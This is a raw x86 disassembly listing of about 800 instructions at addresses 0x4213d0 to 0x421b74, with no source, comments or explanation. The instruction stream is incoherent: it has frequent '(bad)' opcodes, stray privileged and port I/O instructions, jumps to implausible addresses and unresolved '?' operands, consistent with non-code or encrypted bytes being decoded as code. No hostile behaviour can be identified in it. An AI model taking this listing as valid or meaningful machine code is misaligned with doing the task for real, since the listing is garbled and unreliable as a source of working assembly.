  4213d0:	sbb    eax,0x7adc9bb7
  4213d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d6:	jg     0x421450
  4213d8:	xor    eax,0x1b5f114e
  4213dd:	and    al,0xbb
  4213df:	nop
  4213e0:	jnp    0x421436
  4213e2:	(bad)
  4213e5:	mov    bh,0xd2
  4213e7:	retf   
  4213e8:	(bad)  
  4213e9:	sbb    BYTE PTR [edx-0x4fee3b88],cl
  4213ef:	fistp  QWORD PTR [edi+edx*2]
  4213f2:	push   0xffffffbc
  4213f4:	fnsave [ecx-0x3741dc4a]
  4213fa:	or     al,BYTE PTR [ecx]
  4213fc:	jmp    0x64080e0d
  421401:	test   eax,0x9c035b26
  421406:	mov    edi,0xea9aa9a
  42140b:	pop    ecx
  42140c:	cmc    
  42140d:	fild   QWORD PTR [edx]
  42140f:	dec    ebp
  421410:	icebp  
  421411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421412:	xor    al,0xc0
  421414:	stc    
  421415:	and    BYTE PTR [ecx-0x7eda3dea],cl
  42141b:	pop    ss
  42141c:	push   ds
  42141d:	and    eax,0xc06b10e3
  421422:	pop    edi
  421423:	mov    al,0x2c
  421425:	adc    esi,edi
  421427:	mov    ebp,0x638df88f
  42142c:	xchg   DWORD PTR [ebp+0x26],esi
  42142f:	push   esi
  421430:	sbb    al,0x2c
  421432:	jmp    0x4213c6
  421434:	sub    eax,0x6d2c08b2
  421439:	les    esi,FWORD PTR [ecx+0x10]
  42143c:	or     eax,0x679ff2f8
  421441:	inc    ebp
  421442:	jg     0x4213ec
  421444:	(bad)  
  421445:	mov    bh,0x7
  421447:	inc    esi
  421448:	mov    al,ds:0x28d77934
  42144d:	inc    ebx
  42144e:	pop    ebp
  42144f:	ins    BYTE PTR es:[edi],dx
  421450:	andnps xmm7,XMMWORD PTR [ecx]
  421453:	push   eax
  421454:	nop
  421455:	sub    BYTE PTR [edx],0xea
  421458:	add    edi,DWORD PTR ds:0x7471984a
  42145e:	minps  xmm4,XMMWORD PTR [eax+0x33]
  421462:	and    DWORD PTR [ecx-0x45fbbdd9],esp
  421468:	cdq    
  421469:	pop    edx
  42146a:	in     eax,dx
  42146b:	sbb    cl,dl
  42146d:	pop    ebp
  42146e:	out    0x87,eax
  421470:	push   esi
  421471:	jbe    0x4214ea
  421473:	push   0xc1e40a1e
  421478:	sub    eax,0xc70806fa
  42147d:	ins    BYTE PTR es:[edi],dx
  42147e:	call   0xaa81a712
  421483:	sti    
  421484:	inc    ebp
  421485:	fdivr  DWORD PTR [edi+0x118bab02]
  42148b:	ret    
  42148c:	scas   al,BYTE PTR es:[edi]
  42148d:	mov    esi,0xcb06eb92
  421492:	inc    eax
  421493:	push   esp
  421494:	into   
  421495:	imul   ebp,DWORD PTR ds:0x1fd7102,0xffffffbf
  42149c:	(bad)  
  42149d:	mov    bl,0xa6
  42149f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214a0:	repz push edx
  4214a2:	or     al,0x46
  4214a4:	ins    BYTE PTR es:[edi],dx
  4214a5:	stos   BYTE PTR es:[edi],al
  4214a6:	pop    esp
  4214a7:	sbb    DWORD PTR [ebp-0x7ab88b03],edx
  4214ad:	lahf   
  4214ae:	gs jo  0x421444
  4214b1:	or     BYTE PTR ds:0x17d3975c,ch
  4214b7:	mov    ebx,0x4e953996
  4214bc:	sar    BYTE PTR [ebx+ebp*8+0x44e67fc2],0xb
  4214c4:	mov    ds:0x140a6f7c,al
  4214c9:	xchg   DWORD PTR [edx+0x2874c145],esp
  4214cf:	out    dx,al
  4214d0:	out    0x11,eax
  4214d2:	fild   WORD PTR [edx+0x7e]
  4214d5:	rcr    DWORD PTR [edi+eax*1],cl
  4214d8:	jmp    0x668f6821
  4214dd:	ins    BYTE PTR es:[edi],dx
  4214de:	pop    ss
  4214df:	pop    es
  4214e0:	push   eax
  4214e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214e2:	adc    BYTE PTR ds:0xac7b08ab,dl
  4214e8:	ins    DWORD PTR es:[edi],dx
  4214e9:	mov    WORD PTR [ebp-0x5d],?
  4214ec:	inc    esi
  4214ed:	sub    BYTE PTR [ecx],bl
  4214ef:	xchg   ecx,eax
  4214f0:	pop    ss
  4214f1:	(bad)  
  4214f2:	nop
  4214f3:	into   
  4214f4:	repnz mov BYTE PTR [ebp+ebx*4+0x6050a291],dh
  4214fc:	dec    ebp
  4214fd:	jl     0x421579
  4214ff:	sbb    BYTE PTR [edi-0x54],0x96
  421503:	jg     0x4214e9
  421505:	scas   al,BYTE PTR es:[edi]
  421506:	fldl2t 
  421508:	sbb    DWORD PTR [edi],ecx
  42150a:	jae    0x42156e
  42150c:	aad    0xb9
  42150e:	push   0xffffffd1
  421510:	dec    ebp
  421511:	mov    dh,0xcd
  421513:	mov    esp,0x660289b7
  421518:	jle    0x4214a6
  42151a:	sti    
  42151b:	sbb    eax,0x860099f6
  421520:	dec    ecx
  421521:	xchg   edx,eax
  421522:	(bad)  
  421524:	les    esp,FWORD PTR [esi]
  421526:	ins    BYTE PTR es:[edi],dx
  421527:	cs jns 0x4214f7
  42152a:	cld    
  42152b:	and    al,0xc7
  42152d:	jmp    DWORD PTR [esi]
  42152f:	out    dx,al
  421530:	out    0x3a,eax
  421532:	loope  0x42151a
  421534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421535:	arpl   WORD PTR [eax],cx
  421537:	add    eax,ecx
  421539:	add    BYTE PTR [ebx-0x568eef2a],0x5a
  421540:	mov    cl,0xe1
  421542:	dec    esp
  421543:	xlat   BYTE PTR ds:[ebx]
  421544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421545:	mov    ds:0x55067ef9,eax
  42154a:	std    
  42154b:	clc    
  42154c:	mov    esi,0x3c9ed71c
  421551:	icebp  
  421552:	enter  0xb07d,0x56
  421556:	or     ch,BYTE PTR [esi+eiz*2+0x11b06797]
  42155d:	jle    0x42159c
  42155f:	daa    
  421560:	ins    DWORD PTR es:[edi],dx
  421561:	sub    dh,BYTE PTR ds:0x3819f72b
  421567:	pop    esp
  421568:	lds    ecx,FWORD PTR [esi+0x6d50dd22]
  42156e:	loop   0x4215ab
  421570:	fidivr DWORD PTR ds:0xeb284a92
  421576:	les    esp,FWORD PTR [ebp+0x4b180882]
  42157c:	dec    edx
  42157d:	inc    esp
  42157e:	repz or eax,0x763d20b7
  421584:	test   bl,dh
  421586:	xor    BYTE PTR [eax+0x57da00e3],cl
  42158c:	cmp    al,0xbe
  42158e:	add    ebp,DWORD PTR [ecx-0x51]
  421591:	and    bh,dl
  421593:	out    dx,al
  421594:	jg     0x421582
  421596:	adc    eax,0x22ddf058
  42159b:	mov    ah,0x3a
  42159d:	xor    al,0xef
  42159f:	add    dh,BYTE PTR [eax+eax*2+0x22]
  4215a3:	daa    
  4215a4:	fld    QWORD PTR [edx-0x265a214c]
  4215aa:	add    al,0x4d
  4215ac:	outs   dx,BYTE PTR ds:[esi]
  4215ad:	mov    esp,DWORD PTR [esi+0x46]
  4215b0:	mov    ds:0x242ebd96,eax
  4215b5:	mov    esi,0xa92b392b
  4215ba:	jo     0x42155f
  4215bc:	push   edx
  4215bd:	inc    edi
  4215be:	xchg   esi,eax
  4215bf:	dec    ecx
  4215c0:	jl     0x42162f
  4215c2:	push   eax
  4215c3:	xchg   ebx,eax
  4215c4:	test   al,0xa
  4215c6:	mov    ?,WORD PTR [edx]
  4215c8:	mov    eax,0x2be7b2d0
  4215cd:	mov    eax,ds:0x9900f251
  4215d2:	pushf  
  4215d3:	push   0x5b
  4215d5:	or     BYTE PTR [ebp-0x2a16c41],dh
  4215db:	sti    
  4215dc:	ret    
  4215dd:	mov    edi,0x8c211811
  4215e2:	add    BYTE PTR [ebx+0x3e168e10],0x77
  4215e9:	fdiv   DWORD PTR [ebx]
  4215eb:	test   eax,0x31fac227
  4215f0:	push   ds
  4215f1:	inc    esp
  4215f2:	enter  0x403,0x57
  4215f6:	mov    dh,0x7
  4215f8:	mov    al,0xac
  4215fa:	adc    BYTE PTR [eax+0x35],ah
  4215fd:	jp     0x421620
  4215ff:	fistp  WORD PTR [ebp-0x7]
  421602:	fmulp  st(7),st
  421604:	imul   sp,sp,0x6993
  421609:	out    dx,al
  42160a:	ss outs dx,DWORD PTR fs:[esi]
  42160d:	jno    0x421627
  42160f:	lahf   
  421610:	dec    esi
  421611:	out    0xac,eax
  421613:	fs pop ds
  421615:	mov    dl,BYTE PTR [esi+0xdf656e1]
  42161b:	jnp    0x4215d1
  42161d:	or     dh,BYTE PTR [ecx+0x2]
  421620:	sahf   
  421621:	call   0x1b6d1031
  421626:	push   ebx
  421627:	test   BYTE PTR cs:[eax+0x52],dh
  42162b:	dec    ebp
  42162c:	sbb    DWORD PTR [ecx+0x2ae05818],edi
  421632:	stos   DWORD PTR es:[edi],eax
  421633:	or     al,0xef
  421635:	mov    WORD PTR [ecx+ecx*2-0x9],es
  421639:	ins    DWORD PTR es:[edi],dx
  42163a:	push   ebx
  42163b:	mov    bl,0x3
  42163d:	lahf   
  42163e:	outs   dx,DWORD PTR ds:[esi]
  42163f:	test   al,0x65
  421641:	shl    BYTE PTR [ebx+edx*2-0x5098a8c3],1
  421648:	sbb    al,0xdc
  42164b:	sbb    ah,bl
  42164d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42164e:	imul   BYTE PTR [ebx]
  421650:	jnp    0x4216b5
  421652:	mov    ecx,0xe8da7d54
  421657:	inc    ecx
  421658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421659:	pop    es
  42165a:	or     ah,BYTE PTR [ebp+0x5d757687]
  421660:	add    esp,ecx
  421662:	add    ch,bh
  421664:	sbb    eax,0x62d4806
  421669:	mov    dh,BYTE PTR [ebx-0xedce32d]
  42166f:	sbb    DWORD PTR [esp+eiz*4-0x49],esp
  421673:	mov    ds:0x9cefb8f,eax
  421678:	icebp  
  421679:	test   BYTE PTR [edx-0x6faf02ae],cl
  42167f:	push   esp
  421680:	jg     0x421629
  421682:	aas    
  421683:	jl     0x421658
  421685:	mov    ds:0x43003373,eax
  42168a:	inc    BYTE PTR [ebx-0x3d5fb082]
  421690:	in     eax,0x56
  421692:	jp     0x4216f8
  421694:	jb     0x4216cc
  421696:	mov    DWORD PTR [ecx],esi
  421698:	es sub ebp,esi
  42169b:	add    dh,cl
  42169d:	or     DWORD PTR [esi],esi
  42169f:	sbb    BYTE PTR [ecx+0x45],ch
  4216a2:	ret    
  4216a3:	lahf   
  4216a4:	(bad)  
  4216a5:	cli    
  4216a6:	sub    ebx,DWORD PTR [esi+0x50a31c2c]
  4216ac:	jns    0x421680
  4216ae:	pop    ebx
  4216af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216b0:	cmp    BYTE PTR [ecx+0x61247110],bh
  4216b6:	sbb    al,0xf
  4216b8:	pushf  
  4216b9:	cs jp  0x4216f5
  4216bc:	mov    ss,WORD PTR [edi-0x69]
  4216bf:	or     BYTE PTR [esi+esi*2-0x7e6ae322],cl
  4216c6:	pop    edi
  4216c7:	repnz sahf 
  4216c9:	push   edi
  4216ca:	mov    ebx,0x40af12cd
  4216cf:	xlat   BYTE PTR ds:[ebx]
  4216d0:	stos   BYTE PTR es:[edi],al
  4216d1:	jl     0x4216f2
  4216d3:	arpl   bx,ax
  4216d5:	xchg   ebp,eax
  4216d6:	pop    ds
  4216d7:	js     0x421677
  4216d9:	leave  
  4216da:	push   cs
  4216db:	push   ds
  4216dc:	imul   edx,esp,0xc752c2b6
  4216e2:	adc    BYTE PTR [edx-0x1eae75cf],bl
  4216e8:	jmp    0xdb71d97d
  4216ed:	xchg   ebp,eax
  4216ee:	inc    edi
  4216ef:	inc    ebp
  4216f0:	(bad)
  4216f3:	dec    esi
  4216f4:	imul   eax,DWORD PTR [esi],0x5224fdc0
  4216fa:	xor    al,0xf
  4216fc:	test   DWORD PTR [ecx-0x22373063],edi
  421702:	xor    al,BYTE PTR [edx]
  421704:	and    DWORD PTR [ecx+0x16bc1122],ebx
  42170a:	pop    ds
  42170b:	fs push 0x1f
  42170e:	sbb    dl,BYTE PTR [edx+0x50]
  421711:	fld    TBYTE PTR [ebx-0x52]
  421714:	dec    edx
  421715:	pop    ebx
  421716:	dec    ebp
  421717:	ds pop ecx
  421719:	in     eax,0x63
  42171b:	inc    eax
  42171c:	ficom  DWORD PTR [edi]
  42171e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42171f:	outs   dx,BYTE PTR ds:[esi]
  421720:	and    bh,BYTE PTR [ecx+0x33]
  421723:	jmp    FWORD PTR [ecx-0x1f]
  421726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421727:	in     al,0x9
  421729:	mov    ecx,0xb6d7c870
  42172e:	xor    ebx,DWORD PTR [ecx+edi*8-0x2744ce84]
  421735:	popf   
  421736:	jmp    DWORD PTR [eax+0x20934747]
  42173c:	dec    ecx
  42173d:	jno    0x421778
  42173f:	pushw  0xfff3
  421742:	js     0x421776
  421744:	xor    ah,al
  421746:	out    dx,al
  421747:	ja     0x421721
  421749:	stc    
  42174a:	ins    BYTE PTR es:[edi],dx
  42174b:	(bad)  
  42174c:	xchg   ecx,eax
  42174d:	arpl   WORD PTR ds:[edi+0x1a],bx
  421751:	mov    eax,ds:0x7a3ecaa1
  421756:	das    
  421757:	mov    dh,0xf4
  421759:	fs leave 
  42175b:	inc    eax
  42175c:	xlat   BYTE PTR ds:[ebx]
  42175d:	dec    edi
  42175e:	pushf  
  42175f:	push   0xf495aba2
  421764:	mul    BYTE PTR [edx+ebx*2+0xc]
  421768:	sbb    dh,BYTE PTR [esi+0x2c]
  42176b:	cmc    
  42176c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42176d:	jle    0x42175d
  42176f:	(bad)  
  421770:	fwait
  421771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421772:	sub    bh,BYTE PTR [ebx+0x6cbea5da]
  421778:	pop    esp
  421779:	and    BYTE PTR [edx-0x362f1e05],dh
  42177f:	jle    0x42174f
  421781:	test   eax,0x71c74951
  421786:	mov    ecx,edx
  421788:	mov    ecx,0x4ab5c98
  42178d:	mov    ecx,0x2ee55d72
  421792:	pop    es
  421793:	in     eax,0x46
  421795:	push   edx
  421796:	and    ecx,DWORD PTR [ebx+0x73]
  421799:	(bad)  
  42179b:	leave  
  42179c:	enter  0x7fc1,0xc4
  4217a0:	mov    dl,0x70
  4217a2:	test   BYTE PTR [eax-0x14d2e950],0x7a
  4217a9:	outs   dx,BYTE PTR ds:[esi]
  4217aa:	mov    edi,0x2158a641
  4217af:	xchg   BYTE PTR [ebp+0x39],bl
  4217b2:	mov    dh,0x6f
  4217b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217b5:	aad    0xf6
  4217b7:	push   esp
  4217b8:	mov    ds:0xd60dad95,eax
  4217bd:	mov    ebx,0x75812bb4
  4217c2:	and    al,0x20
  4217c4:	test   DWORD PTR [eax-0x76],ecx
  4217c7:	xchg   esp,eax
  4217c8:	ror    dh,0xdd
  4217cb:	in     al,dx
  4217cc:	dec    ecx
  4217cd:	lods   al,BYTE PTR ds:[esi]
  4217ce:	aam    0x36
  4217d0:	sbb    al,0xaf
  4217d2:	cli    
  4217d3:	adc    dl,0x6d
  4217d6:	aad    0x40
  4217d8:	sub    ah,al
  4217da:	loopne 0x421840
  4217dc:	aas    
  4217dd:	dec    edx
  4217de:	add    eax,0x9c9e4f0
  4217e3:	add    esi,DWORD PTR [ebp+0x6a76fc15]
  4217e9:	add    bl,BYTE PTR [ecx-0x4aa868c8]
  4217ef:	jmp    0x421794
  4217f1:	bound  eax,QWORD PTR [edi+0x37a74622]
  4217f7:	jno    0x42177f
  4217f9:	stos   DWORD PTR es:[edi],eax
  4217fa:	inc    ebp
  4217fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217fc:	retf   0xbe98
  4217ff:	dec    ebx
  421800:	(bad)  
  421801:	jg     0x421856
  421803:	push   0xffffffba
  421805:	lahf   
  421806:	inc    esp
  421807:	out    0x2d,al
  421809:	loopne 0x4217b6
  42180b:	lods   eax,DWORD PTR ds:[esi]
  42180c:	in     al,dx
  42180d:	shl    ebp,1
  42180f:	and    cl,bh
  421811:	mov    eax,cs:0x2411a5af
  421817:	sbb    esi,ebp
  421819:	dec    ebx
  42181a:	push   es
  42181b:	xchg   BYTE PTR [esi],ah
  42181d:	imul   edi,DWORD PTR [ecx+0x4c87994d],0xffffffca
  421824:	arpl   WORD PTR [ecx+0x32],ax
  421827:	cmp    DWORD PTR [edx],ebp
  421829:	sti    
  42182a:	pop    edi
  42182b:	(bad)
  42182e:	in     al,0xa5
  421830:	pop    esi
  421831:	xlat   BYTE PTR ds:[ebx]
  421832:	sub    BYTE PTR [edx-0x64f932f],0x67
  421839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42183a:	nop
  42183b:	mov    WORD PTR [esi-0x80],?
  42183e:	inc    esi
  42183f:	sbb    ch,0x88
  421842:	(bad)  
  421844:	nop
  421845:	dec    eax
  421846:	xor    DWORD PTR [esi],0xb
  421849:	xchg   edi,eax
  42184a:	push   cs
  42184b:	lds    esi,FWORD PTR [edi+edx*2+0x5d]
  42184f:	push   ss
  421850:	stos   DWORD PTR es:[edi],eax
  421851:	mov    ah,0x47
  421853:	sbb    eax,0x100bcbc5
  421858:	lea    esp,[ebp+0x301fdefe]
  42185e:	js     0x421800
  421860:	out    0xd5,eax
  421862:	cmp    al,0x73
  421864:	cmp    eax,0xaa44decf
  421869:	fldcw  WORD PTR [edi-0x7e]
  42186c:	daa    
  42186d:	stos   DWORD PTR es:[edi],eax
  42186e:	jno    0x4217f6
  421870:	pop    eax
  421871:	xchg   BYTE PTR [eax+eax*1],bl
  421874:	cs mov cl,0xf5
  421877:	push   cs
  421878:	inc    ebp
  421879:	sbb    eax,0x6a52a125
  42187e:	popa   
  42187f:	pushf  
  421880:	(bad)  
  421881:	xlat   BYTE PTR ds:[ebx]
  421882:	mov    ecx,?
  421884:	dec    edi
  421885:	mov    esi,0xa10cdfc7
  42188a:	aad    0xf8
  42188c:	add    dl,dh
  42188e:	shl    DWORD PTR ds:0x6c2bd1d8,1
  421894:	rol    DWORD PTR [edx],cl
  421896:	sti    
  421897:	ror    edx,1
  421899:	stos   DWORD PTR es:[edi],eax
  42189a:	xchg   edi,eax
  42189b:	xor    ch,bl
  42189d:	(bad)  
  42189e:	sub    DWORD PTR [ecx-0x70],eax
  4218a1:	mov    bl,0xea
  4218a3:	cwde   
  4218a4:	int    0x97
  4218a6:	scas   al,BYTE PTR es:[edi]
  4218a7:	and    BYTE PTR [ebp+ecx*4+0x8],0x77
  4218ac:	mov    ebx,0xe34ee6d1
  4218b1:	inc    ecx
  4218b2:	shl    DWORD PTR [ecx+0x570d9fbb],0x11
  4218b9:	test   BYTE PTR [ebp+0xb],ch
  4218bc:	(bad)  
  4218bd:	xchg   edi,eax
  4218be:	test   BYTE PTR [ecx-0x5f9268fc],dl
  4218c4:	es jmp 0x421910
  4218c7:	push   ecx
  4218c8:	push   0x62593882
  4218cd:	inc    ebp
  4218ce:	adc    eax,0x99f3ea5f
  4218d3:	ficomp WORD PTR [esp+eax*2-0x69]
  4218d7:	add    eax,0xadfb4ea0
  4218dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218dd:	mov    al,0x5
  4218df:	fild   DWORD PTR [ebx]
  4218e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218e2:	or     dh,BYTE PTR [edi-0x1e]
  4218e5:	jbe    0x421930
  4218e7:	iret   
  4218e8:	popf   
  4218e9:	aad    0xc1
  4218eb:	leave  
  4218ec:	pop    esp
  4218ed:	or     ebx,DWORD PTR [esi]
  4218ef:	test   eax,0x196dd616
  4218f4:	xor    al,0x77
  4218f6:	xchg   edx,eax
  4218f7:	mov    eax,0xadd59158
  4218fc:	jp     0x4218ec
  4218fe:	arpl   WORD PTR [edx+0x35],sp
  421901:	sbb    eax,0x13323da0
  421906:	nop
  421907:	aad    0xf1
  421909:	xchg   ecx,eax
  42190a:	jae    0x4218b6
  42190c:	in     al,dx
  42190d:	xor    BYTE PTR [eax-0xbf7738c],ah
  421913:	clc    
  421914:	int    0x63
  421916:	mov    ds:0xa9852f8d,eax
  42191b:	arpl   WORD PTR [edi-0x4d],dx
  42191e:	pop    edi
  42191f:	inc    esi
  421920:	sbb    BYTE PTR [esi-0x5a],al
  421923:	ret    
  421924:	dec    esp
  421925:	cs repnz sti 
  421928:	and    ch,BYTE PTR [di+0x6c2d]
  42192d:	mov    eax,ds:0xf5c2e982
  421932:	sahf   
  421933:	in     eax,0x33
  421935:	jns    0x42192d
  421937:	push   ecx
  421938:	(bad)  
  42193a:	(bad)  
  42193b:	mov    al,ds:0x831ce30
  421940:	(bad)  
  421941:	cmp    ecx,DWORD PTR [esi+0x18]
  421944:	add    eax,0xe4a9a41c
  421949:	ror    BYTE PTR [ebp-0x920ab41],cl
  42194f:	gs mov ebp,0x1444eab1
  421955:	mov    ebp,0x993e7e2
  42195a:	sbb    dl,ah
  42195c:	and    al,0x83
  42195e:	pushf  
  42195f:	dec    esp
  421960:	test   DWORD PTR [eax-0x40],edx
  421963:	mov    edx,0x7e933e4
  421968:	gs pop esp
  42196a:	dec    esi
  42196b:	je     0x421907
  42196d:	inc    ecx
  42196e:	jns    0x421947
  421970:	lea    ebp,[edx-0x5f153ea6]
  421976:	es dec ebp
  421978:	xchg   esp,eax
  421979:	sub    eax,ebp
  42197b:	loop   0x4219cc
  42197d:	stos   WORD PTR es:[edi],ax
  42197f:	imul   BYTE PTR [ebx-0x70ad21fd]
  421985:	addr16 icebp 
  421987:	push   eax
  421988:	xor    BYTE PTR [ebp+ecx*1-0x27145d4d],bh
  42198f:	inc    eax
  421990:	je     0x42191f
  421992:	inc    esi
  421993:	out    0x19,eax
  421995:	ja     0x421a01
  421997:	and    eax,0x75b18534
  42199c:	mov    dh,0x49
  42199e:	in     eax,dx
  42199f:	jmp    0x9edc45fa
  4219a4:	sbb    edx,DWORD PTR [edx-0x1a]
  4219a7:	mov    WORD PTR [ecx+0x6e],fs
  4219aa:	mov    ds:0x15cdae9c,al
  4219af:	and    dh,BYTE PTR [eax]
  4219b1:	imul   edx,DWORD PTR [ecx-0x1cd1954],0xf9c9686
  4219bb:	imul   ebx,edx,0xffffffe9
  4219be:	pop    eax
  4219bf:	pop    edi
  4219c0:	jnp    0x421a14
  4219c2:	addr16 test al,0x52
  4219c5:	sbb    BYTE PTR [ecx-0x63],al
  4219c8:	shl    edx,cl
  4219ca:	sbb    DWORD PTR [edx],esi
  4219cc:	(bad)  
  4219cd:	ss arpl cx,dx
  4219d0:	cmp    DWORD PTR [ecx],esp
  4219d2:	mov    ch,0x3b
  4219d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219d5:	push   ds
  4219d6:	inc    ebp
  4219d7:	ss in  eax,0xd3
  4219da:	neg    DWORD PTR [esi-0x56]
  4219dd:	nop
  4219de:	sub    BYTE PTR [esi],dh
  4219e0:	ja     0x4219cf
  4219e2:	or     ebx,DWORD PTR [esi+0x2f]
  4219e5:	je     0x421a21
  4219e7:	in     eax,dx
  4219e8:	fwait
  4219e9:	in     eax,0xb
  4219eb:	les    esp,FWORD PTR [ecx+edi*2]
  4219ee:	dec    edi
  4219ef:	push   ebp
  4219f0:	popf   
  4219f1:	mov    ebx,0x8f41dab8
  4219f6:	sbb    al,0xee
  4219f8:	iret   
  4219f9:	push   esp
  4219fa:	xchg   ebx,eax
  4219fb:	add    al,0x59
  4219fd:	cmp    edx,DWORD PTR [ecx+ecx*2+0x58]
  421a01:	leave  
  421a02:	int3   
  421a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a04:	sti    
  421a05:	xor    DWORD PTR [eax+0x79],ebx
  421a08:	in     eax,0xfa
  421a0a:	and    eax,DWORD PTR [ecx-0x18]
  421a0d:	or     BYTE PTR [edi+0x44c66bc6],dh
  421a13:	mov    fs,esi
  421a15:	inc    ecx
  421a16:	pop    ss
  421a17:	xchg   ecx,eax
  421a18:	ins    BYTE PTR es:[edi],dx
  421a19:	push   0xffffff9e
  421a1b:	outs   dx,DWORD PTR ds:[esi]
  421a1c:	mov    bl,0xe8
  421a1e:	cwde   
  421a1f:	lds    ecx,FWORD PTR [ebp+eax*1+0x23]
  421a23:	ins    BYTE PTR es:[edi],dx
  421a24:	int3   
  421a25:	mov    ebp,0xbc04d5f6
  421a2a:	stc    
  421a2b:	xchg   ebp,eax
  421a2c:	and    DWORD PTR [esi+0x3d],ecx
  421a2f:	pusha  
  421a30:	adc    DWORD PTR [ebx],esi
  421a32:	sahf   
  421a33:	fwait
  421a34:	pop    ds
  421a35:	jno    0x421a51
  421a37:	adc    eax,0xe9cb2d99
  421a3c:	leave  
  421a3d:	push   eax
  421a3e:	jb     0x421a58
  421a40:	mov    ebx,esp
  421a42:	push   0xffffffcb
  421a44:	pop    es
  421a45:	pop    ebx
  421a46:	test   DWORD PTR [ecx-0x5e],edi
  421a49:	cmp    al,0xeb
  421a4b:	fiadd  DWORD PTR [ebx]
  421a4d:	adc    eax,0xc3b38666
  421a52:	retf   0xaef1
  421a55:	and    al,0xcd
  421a57:	fsubr  QWORD PTR [ecx]
  421a59:	inc    BYTE PTR [ecx-0x65]
  421a5c:	das    
  421a5d:	dec    edx
  421a5e:	xchg   ebp,eax
  421a5f:	push   es
  421a60:	mov    ss,WORD PTR [ecx]
  421a62:	pop    ss
  421a63:	ins    DWORD PTR es:[edi],dx
  421a64:	jbe    0xe7b95953
  421a6a:	sahf   
  421a6b:	pop    edx
  421a6c:	js     0x421a3a
  421a6e:	(bad)  
  421a70:	xchg   BYTE PTR [ecx],cl
  421a72:	push   ebp
  421a73:	jns    0x421a6b
  421a75:	jno    0x421a25
  421a77:	xor    bl,BYTE PTR [ebx+0x493c39b2]
  421a7d:	xor    ah,BYTE PTR [esi]
  421a7f:	aam    0x51
  421a81:	sub    ch,bl
  421a83:	sbb    BYTE PTR [ecx],ah
  421a85:	add    al,0x6e
  421a87:	mov    ah,0xa3
  421a89:	int3   
  421a8a:	adc    eax,0xc0398c46
  421a8f:	mov    ebp,0xcc20f892
  421a94:	adc    al,0xde
  421a96:	neg    BYTE PTR [ebp+eiz*8+0x39f4da77]
  421a9d:	mov    ebp,0x9f6a0e51
  421aa2:	mov    esi,0x875764e5
  421aa7:	xchg   edi,eax
  421aa8:	or     BYTE PTR ds:0x76981972,bh
  421aae:	ds pushf 
  421ab0:	jp     0x421a54
  421ab2:	mov    bl,0x42
  421ab4:	pop    esi
  421ab5:	imul   BYTE PTR [ebx-0x67]
  421ab8:	cmp    BYTE PTR [ebx],0x35
  421abb:	adc    ebp,esi
  421abd:	mov    edx,0x18adf47
  421ac2:	les    edi,FWORD PTR ds:0xd6ad1f84
  421ac8:	jne    0x421a79
  421aca:	addr16 cmp ebp,esi
  421acd:	inc    ecx
  421ace:	xchg   esp,eax
  421acf:	and    DWORD PTR [edi],ecx
  421ad1:	dec    ecx
  421ad2:	xor    eax,ecx
  421ad4:	sub    eax,0xed3ff9f
  421ad9:	inc    esp
  421ada:	mov    al,ds:0xb0262ff3
  421adf:	or     ecx,esi
  421ae1:	in     al,dx
  421ae2:	push   ss
  421ae3:	or     al,0x3b
  421ae5:	int3   
  421ae6:	rcl    DWORD PTR [ebx],1
  421ae8:	adc    eax,0x6c5e50c8
  421aed:	adc    DWORD PTR [esi],ebp
  421aef:	mov    edx,0x6dbf5fda
  421af4:	add    esp,DWORD PTR [ecx]
  421af6:	add    eax,0x46b6e9f
  421afb:	(bad)
  421afe:	jae    0x421add
  421b00:	inc    ebx
  421b01:	adc    ah,BYTE PTR [ecx+esi*4]
  421b04:	inc    edi
  421b05:	adc    al,0x6
  421b07:	lahf   
  421b08:	xor    edx,DWORD PTR [ebp+ecx*8-0x48]
  421b0c:	and    al,0xd5
  421b0e:	adc    DWORD PTR ds:0xfbc49445,0x3f8b7074
  421b18:	jle    0x421b25
  421b1a:	mov    edx,0x6face926
  421b1f:	loope  0x421afd
  421b21:	xchg   ebp,eax
  421b22:	movntq QWORD PTR [edi],mm3
  421b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b26:	nop
  421b27:	ret    0x28b6
  421b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b2b:	ja     0x421b07
  421b2d:	mov    eax,0xb20ff539
  421b32:	icebp  
  421b33:	mov    ebx,0xbc2b552a
  421b38:	cmp    al,0xc0
  421b3a:	into   
  421b3b:	mov    ecx,fs
  421b3d:	xchg   DWORD PTR [esi+0x62],edx
  421b40:	mov    cs,WORD PTR [esi-0x406caa78]
  421b46:	adc    bh,ch
  421b48:	jp     0x421bc2
  421b4a:	mov    ds:0x982dac86,al
  421b4f:	sub    eax,0x939dff7a
  421b54:	fidiv  WORD PTR [edx-0x25]
  421b57:	aaa    
  421b58:	dec    esp
  421b59:	cmp    BYTE PTR [ebx],0x98
  421b5c:	cdq    
  421b5d:	inc    eax
  421b5e:	or     eax,0x7d187349
  421b63:	pop    ebx
  421b64:	adc    eax,DWORD PTR [ecx]
  421b66:	inc    edi
  421b67:	xchg   edx,eax
  421b68:	fsubr  DWORD PTR [edi+esi*1]
  421b6b:	data16 scas al,BYTE PTR es:[edi]
  421b6d:	pop    edi
  421b6e:	xor    BYTE PTR [edx],0xa1
  421b71:	(bad)  
  421b72:	xchg   ecx,eax
  421b73:	ret    
  421b74:	inc    eax
